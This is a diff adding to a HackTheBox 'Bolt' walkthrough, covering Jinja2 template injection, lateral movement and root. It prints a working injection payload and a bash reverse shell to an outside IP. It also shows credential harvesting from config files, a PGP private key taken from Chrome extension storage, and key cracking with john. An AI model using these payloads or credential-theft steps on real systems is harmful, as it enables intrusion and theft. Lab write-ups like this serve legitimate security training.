@@ -149,6 +149,196 @@ def register():
 
 ![Screenshot from 2022-02-19 21-45-53](https://user-images.githubusercontent.com/79413473/154809165-683b3386-4dde-42bd-9f9d-9ba14bc11365.png)
 
++ We can execute command on this by climbing up to base class of current object and then accessing **popen** subclass. i have explained this in detail in [this](https://newrouge.blogspot.com/2022/02/epsilon-hackthebox.html) blogspot.
+
++ Using this payload we got code execution:
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[222]("id", shell=True, stdout=-1).communicate() }}
+```  
++ Get a reverse shell with this paylaod 
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[222]("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.165/8084 0>&1'", shell=True, stdout=-1).communicate() }}
+``` 
++ If your reverse shell keeps dying after some time, use **setsid** command before reverse shell as it starts process in new session.
+
+![Screenshot from 2022-02-19 22-32-51](https://user-images.githubusercontent.com/79413473/154810903-4fb38d8a-0903-4e16-b2e1-4d0de3f9309e.png)
+
+## Lateral movement:
+
++ After looking around for passwords i got 2 password **bolt_dba : dXUUHSW9vBpH5qRB** & **roundcubeuser:WXg5He2wHt4QYHuyGET**. but none of them is reused anywhere you can login into databases with them. Now looking at */etc/nginx/sites-enabled/nginx-passbolt.conf*
+
+```
+root /usr/share/php/passbolt/webroot;
+  index index.php;
+  #error_log /var/log/nginx/passbolt-error.log info;
+  access_log /var/log/nginx/passbolt-access.log;
+
+  # Managed by Passbolt
+  include /etc/passbolt/nginx-ssl.conf;
+
+  location / {
+    try_files $uri $uri/ /index.php?$args;
+  }
+``` 
++ searching through passwords in */usr/share/php/passbolt/webroot* fot nothing then finally we get something in */etc/passbolt*. 
++ `cat /etc/passbolt/passbolt.php`
+
+```
+// Database configuration.
+    'Datasources' => [
+        'default' => [
+            'host' => 'localhost',
+            'port' => '3306',
+            'username' => 'passbolt',
+            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
+            'database' => 'passboltdb',
+
+```
++ You can use this password to login as eddie via ssh **not** su eddie.
++ Now when you ssh, you get a notification that you got a mail. And mails are in */var/mail/*. Read eddie's mail .
+
+```
+From clark@bolt.htb  Thu Feb 25 14:20:19 2021
+Return-Path: <clark@bolt.htb>
+X-Original-To: eddie@bolt.htb
+Delivered-To: eddie@bolt.htb
+Received: by bolt.htb (Postfix, from userid 1001)
+	id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+Subject: Important!
+To: <eddie@bolt.htb>
+X-Mailer: mail (GNU Mailutils 3.7)
+Message-Id: <20210225212019.DFF264CD@bolt.htb>
+Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+From: Clark Griswold <clark@bolt.htb>
+
+Hey Eddie,
+
+The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
+Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...
+
+-Clark
+``` 
++ clark talks about some private keys, we have seen gpg all over the box it maybe pgp keys. Also there is mention of browser. If you will run linpeas on machine you will see that some google-chrome extension is lyting in eddie's *.config* directory.
+
+![Screenshot from 2022-02-20 00-19-46](https://user-images.githubusercontent.com/79413473/154814765-69e41675-a58b-4251-895b-346697660dcb.png)
+
++ When you log into mysql as passbolt you also see some pgp encrypted message in **secrets** table.
+
+![Screenshot from 2022-02-20 00-22-05](https://user-images.githubusercontent.com/79413473/154814914-cb7c1863-5eb0-433c-8a36-4b9d73fb5fcf.png)
+
++ Copy that your machine, we will need pgp keys to decrypt this message. Let's search through google-chrome folder. Had to take some help in discord server to find that.
+
++ Now you can grep for "PGP PRIVATE KEY" in that folder and this is the file you want 
+
+```
+/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log
+```
+
++ Now read this file and copy paste pgp private keys from there. You have to reformat the line break to bring key in correct format.
+
+![Screenshot from 2022-02-20 00-41-04](https://user-images.githubusercontent.com/79413473/154815459-989550d7-e4d4-44b1-9ab0-3d68d8e53a2e.png)
+
++ correct formatted pgp private key
+
+```
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+Version: OpenPGP.js v4.10.9
+Comment: https://openpgpjs.org
+
+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
+PSwYYWlAywj5
+=cqxZ
+-----END PGP PRIVATE KEY BLOCK-----
+``` 
+
+![Screenshot from 2022-02-20 00-43-14](https://user-images.githubusercontent.com/79413473/154815541-11886e2d-5883-438d-a0af-8427a23d28dd.png)
+
++ Now you can decrypt the message by this command `gpg -d message`. But you will get an error, *no secret key*, you will need to first import the private key into gpg. 
++ We also need to crack this gpg private key , for that we will need tool *gpg2john*, i struggled with other sources. Also normal john-the-ripper doesn't wotk for me. Only Ubuntu snap's john-the-ripper works on my mcahine. Fortunately it also has package for gpg2john.
+
+![Screenshot from 2022-02-20 00-46-35](https://user-images.githubusercontent.com/79413473/154815662-f8d6b3d3-3a0a-4564-91a7-981ebc723acd.png)
+
++ `john-the-ripper.gpg2john private_key > hash`.
++ Now we can crack this hash with john-the-ripper. For some reason i couldn't crack it again. As john-the-ripper won't crack it agian. I got a solution i removed john-the-ripper and installed it again and now it was brand new and cracked it.
+
+![Screenshot from 2022-02-20 01-50-24](https://user-images.githubusercontent.com/79413473/154817713-78d80444-b8c0-496e-9b83-dfd14396413b.png)
+
++ Let's import the pgp key. `gpg --import private.key`. Enter the password **merrychristmas**. 
++ Decrypt the message recovered from database. `gpg -d message`. It will aks for password again.
+
+```
+gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
+      "Eddie Johnson <eddie@bolt.htb>"
+{"password":"Z(2rmxsNW(Z?3=p/9s","description":""}gpg: Signature made Saturday 06 March 2021 09:03:54 PM IST
+gpg:                using RSA key 1C2741A3DC3B4ABD
+gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
+gpg: WARNING: This key is not certified with a trusted signature!
+gpg:          There is no indication that the signature belongs to the owner.
+Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
+``` 
+
++ It gives a password. which doesn't authenticate as clark and doesn't ssh as root also. But you can do **su root** with this password and we got finally root on this box.
+
+
+
+
 
 
 
